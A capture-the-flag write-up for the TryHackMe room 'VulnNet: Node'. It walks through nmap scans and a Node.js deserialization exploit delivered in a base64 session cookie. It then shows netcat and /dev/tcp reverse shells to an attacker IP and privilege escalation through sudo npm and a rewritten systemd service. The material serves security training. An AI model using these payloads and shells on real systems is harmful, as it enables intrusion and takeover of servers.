---
title: "TryHackMe - VulnNet: Node"
tags: ["linux", "web", "base64", "deserialization", "node.js", "sudo", "npm", "systemctl", "service"]
---

## Introduction

This is a **TryHackMe** room which can be found at: <a href="https://tryhackme.com/room/vulnnetnode" target="_blank">VulnNet: Node</a>

After the previous breach, VulnNet Entertainment states it won't happen again. Can you prove they're wrong?

## Reconnaissance & Scanning

Perform `nmap` scan to identify open ports and services.
- Command: `nmap -p- -T4 -v 10.10.213.208`


```shell
geobour98@kali:~$ nmap -p- -T4 -v 10.10.213.208 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 10:44 EEST
Initiating Ping Scan at 10:44
Scanning 10.10.213.208 [2 ports]
Completed Ping Scan at 10:44, 0.07s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:44
Completed Parallel DNS resolution of 1 host. at 10:44, 0.00s elapsed
Initiating Connect Scan at 10:44
Scanning 10.10.213.208 (10.10.213.208) [65535 ports]
Discovered open port 8080/tcp on 10.10.213.208
Completed Connect Scan at 10:45, 60.48s elapsed (65535 total ports)
Nmap scan report for 10.10.213.208 (10.10.213.208)
Host is up (0.070s latency).
Not shown: 65534 closed tcp ports (conn-refused)
PORT     STATE SERVICE
8080/tcp open  http-proxy

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 60.59 seconds
```

Perform aggressive `nmap` scan to enable OS detection, default scripts and version detection on the found ports. 
- Command: `sudo nmap -A -sC -p 8080 -v 10.10.213.208`


```shell
geobour98@kali:~$ sudo nmap -A -sC -p 8080 -v 10.10.213.208
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-04 10:46 EEST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
Initiating NSE at 10:46
Completed NSE at 10:46, 0.00s elapsed
Initiating Ping Scan at 10:46
Scanning 10.10.213.208 [4 ports]
Completed Ping Scan at 10:46, 0.13s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:46
Completed Parallel DNS resolution of 1 host. at 10:46, 0.01s elapsed
Initiating SYN Stealth Scan at 10:46
Scanning 10.10.213.208 (10.10.213.208) [1 port]
Discovered open port 8080/tcp on 10.10.213.208
Completed SYN Stealth Scan at 10:46, 0.11s elapsed (1 total ports)
Initiating Service scan at 10:46
Scanning 1 service on 10.10.213.208 (10.10.213.208)
Completed Service scan at 10:46, 7.89s elapsed (1 service on 1 host)
Initiating OS detection (try #1) against 10.10.213.208 (10.10.213.208)
Retrying OS detection (try #2) against 10.10.213.208 (10.10.213.208)
Initiating Traceroute at 10:46
Completed Traceroute at 10:46, 0.07s elapsed
Initiating Parallel DNS resolution of 1 host. at 10:46
Completed Parallel DNS resolution of 1 host. at 10:46, 0.00s elapsed
NSE: Script scanning 10.10.213.208.
Initiating NSE at 10:46
Completed NSE at 10:46, 11.65s elapsed
Initiating NSE at 10:46
Completed NSE at 10:47, 2.20s elapsed
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Nmap scan report for 10.10.213.208 (10.10.213.208)
Host is up (0.072s latency).

PORT     STATE SERVICE VERSION
8080/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: VulnNet &ndash; Your reliable news source &ndash; Try Now!
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.11 (92%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 33.159 days (since Tue Aug  2 06:58:11 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   68.75 ms 10.8.0.1 (10.8.0.1)
2   68.81 ms 10.10.213.208 (10.10.213.208)

NSE: Script Post-scanning.
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Initiating NSE at 10:47
Completed NSE at 10:47, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.19 seconds
           Raw packets sent: 59 (4.152KB) | Rcvd: 40 (3.012KB)
```

Navigate to port `8080`, click `LOGIN NOW`, put in the Email field of the login form `test@test.com` and in the password field `test`, open Burp Suite and Intercept the request. Then send it to Repeater.

The request should look like this:


```shell
GET /login? HTTP/1.1
Host: 10.10.213.208:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.213.208:8080/login
Cookie: session=eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D
Upgrade-Insecure-Requests: 1


```

In the `Cookie` header of the request if we decode the session value from base64 we identify a serialized object.
- Command: `echo -n "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D" | base64 -d`


```shell
geobour98@kali:~$ echo -n "eyJ1c2VybmFtZSI6Ikd1ZXN0IiwiaXNHdWVzdCI6dHJ1ZSwiZW5jb2RpbmciOiAidXRmLTgifQ%3D%3D" | base64 -d
{"username":"Guest","isGuest":true,"encoding": "utf-8"}
```

Then, we can send another request modifying the value of the cookie to identify any errors. 

The request should look like this:


```shell
GET / HTTP/1.1
Host: 10.10.213.208:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.213.208:8080/login
Cookie: session=eyJ1c2VybmFtZSI6Ik
Upgrade-Insecure-Requests: 1


```

The response containing information about `unserialize` function of `Node.js` is the following:


```shell
HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 1160
Date: Sun, 04 Sep 2022 08:08:19 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>SyntaxError: Unexpected end of JSON input<br> &nbsp; &nbsp;at JSON.parse (&lt;anonymous&gt;)<br> &nbsp; &nbsp;at Object.exports.unserialize (/home/www/VulnNet-Node/node_modules/node-serialize/lib/serialize.js:62:16)<br> &nbsp; &nbsp;at /home/www/VulnNet-Node/server.js:16:24<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/home/www/VulnNet-Node/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/home/www/VulnNet-Node/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /home/www/VulnNet-Node/node_modules/express/lib/router/index.js:281:22<br> &nbsp; &nbsp;at Function.process_params (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:335:12)<br> &nbsp; &nbsp;at next (/home/www/VulnNet-Node/node_modules/express/lib/router/index.js:275:10)</pre>
</body>
</html>
```


## Exploitation


We can create a serialized object that contains a reverse shell, base64 encode it and then URL encode any special characters.

The serialized object should look like this:


```javascript
{"username":"_$$ND_FUNC$$_function (){require('child_process').exec(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.200.50 443 >/tmp/f\", function(error, stdout, stderr) { console.log(stdout) });}()"}
```

Go in `Decoder` in Burp Suite and put the serialized object. Then click on `Encode as` and select `Base64` so the output should look like this:


```shell
eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA+L3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9
```

Before putting the base64 encoded value in the Cookie, URL encode any special characters. In my case, only the `+` should become `%2b`.

The final request in order to get reverse shell should look like this:


```shell
GET / HTTP/1.1
Host: 10.10.213.208:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Referer: http://10.10.213.208:8080/login
Cookie: session=eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbiAoKXtyZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlYyhcInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2Z8L2Jpbi9zaCAtaSAyPiYxfG5jIDEwLjguMjAwLjUwIDQ0MyA%2bL3RtcC9mXCIsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9
Upgrade-Insecure-Requests: 1


```

Open a netcat listener and click `Send` on the Repeater tab and we get a reverse shell as `www`


```shell
geobour98@kali:~$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.8.200.50] from (UNKNOWN) [10.10.213.208] 58244
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www@vulnnet-node:~/VulnNet-Node$ ^Z
zsh: suspended  nc -lvnp 443
geobour98@kali:~$ stty raw -echo;fg
1]  + continued  nc -lvnp 443

www@vulnnet-node:~/VulnNet-Node$ 
www@vulnnet-node:~/VulnNet-Node$ export TERM=xterm-256color
www@vulnnet-node:~/VulnNet-Node$ stty rows 38 cols 111
www@vulnnet-node:~/VulnNet-Node$ whoami
www
www@vulnnet-node:~/VulnNet-Node$ id
uid=1001(www) gid=1001(www) groups=1001(www)
```

The server performed deserialization of the `Cookie` header so the reverse shell was executed. The payload used can be found in this great article: <a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank">Exploiting Node.js deserialization bug for Remote Code Execution</a>, which is about `Node.js` deserialization as in our case.

## Privilege Escalation

After executing the command: `sudo -l` we see that we can execute `npm` as `serv-manage` without being asked for password. 


```shell
www@vulnnet-node:~/VulnNet-Node$ sudo -l
Matching Defaults entries for www on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www may run the following commands on vulnnet-node:
    (serv-manage) NOPASSWD: /usr/bin/npm
```

A great exploit for this can be found on: <a href="https://gtfobins.github.io/gtfobins/npm/#sudo" target="_blank">GTFObins npm</a>


```shell
www@vulnnet-node:~/VulnNet-Node$ cd /dev/shm
www@vulnnet-node:/dev/shm$ echo '{"scripts": {"preinstall": "/bin/bash"}}' > /dev/shm/package.json
www@vulnnet-node:/dev/shm$ sudo -u serv-manage npm -C /dev/shm/ --unsafe-perm i

> @ preinstall /dev/shm
> /bin/bash

serv-manage@vulnnet-node:/dev/shm$ cd /home/serv-manage
serv-manage@vulnnet-node:~$ id
uid=1000(serv-manage) gid=1000(serv-manage) groups=1000(serv-manage)
serv-manage@vulnnet-node:~$ cat user.txt
THM{[REDACTED]}
```

Now we are the user `serv-manage`.

We execute `sudo -l` and we see that we can start/stop the following systemd timers and reload the systemd manager configuration as root.


```shell
serv-manage@vulnnet-node:~$ sudo -l
Matching Defaults entries for serv-manage on vulnnet-node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User serv-manage may run the following commands on vulnnet-node:
    (root) NOPASSWD: /bin/systemctl start vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl stop vulnnet-auto.timer
    (root) NOPASSWD: /bin/systemctl daemon-reload
```

Find where `vulnnet-auto.timer` is located and open that file.


```shell
serv-manage@vulnnet-node:~$ locate vulnnet-auto.timer
/etc/systemd/system/vulnnet-auto.timer
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-auto.timer
[Unit]
Description=Run VulnNet utilities every 30 min

[Timer]
OnBootSec=0min
# 30 min job
OnCalendar=*:0/30
Unit=vulnnet-job.service

[Install]
WantedBy=basic.target
```

We see that `vulnnet-job.service` is called so we find where this service is located and open it.


```shell
serv-manage@vulnnet-node:~$ locate vulnnet-job.service
/etc/systemd/system/vulnnet-job.service
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/df

[Install]
WantedBy=multi-user.target
```

First, stop the timer with `systemctl`, then modify `vulnnet-job.service` in order to get reverse shell as root, reload the configuration and start the timer again with `systemctl`.


```shell
serv-manage@vulnnet-node:~$ sudo /bin/systemctl stop vulnnet-auto.timer
serv-manage@vulnnet-node:~$ cat /etc/systemd/system/vulnnet-job.service
[Unit]
Description=Logs system statistics to the systemd journal
Wants=vulnnet-auto.timer

[Service]
# Gather system statistics
Type=forking
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.8.200.50/444 0>&1'

[Install]
WantedBy=multi-user.target
serv-manage@vulnnet-node:~$ sudo /bin/systemctl daemon-reload
serv-manage@vulnnet-node:~$ sudo /bin/systemctl start vulnnet-auto.timer
```

Open another netcat listener on `444` port and we get root reverse shell.


```shell
geobour98@kali:~$ nc -lvnp 444   
listening on [any] 444 ...
connect to [10.8.200.50] from (UNKNOWN) [10.10.213.208] 55696
bash: cannot set terminal process group (1119): Inappropriate ioctl for device
bash: no job control in this shell
root@vulnnet-node:/# cd /root
root@vulnnet-node:/root# id    
uid=0(root) gid=0(root) groups=0(root)
root@vulnnet-node:/root# cat root.txt
THM{[REDACTED]}
```

Proof of Concept (PoC image):
![Desktop View](/assets/img/vulnnetnode/poc.png){: width="972" height="589" }
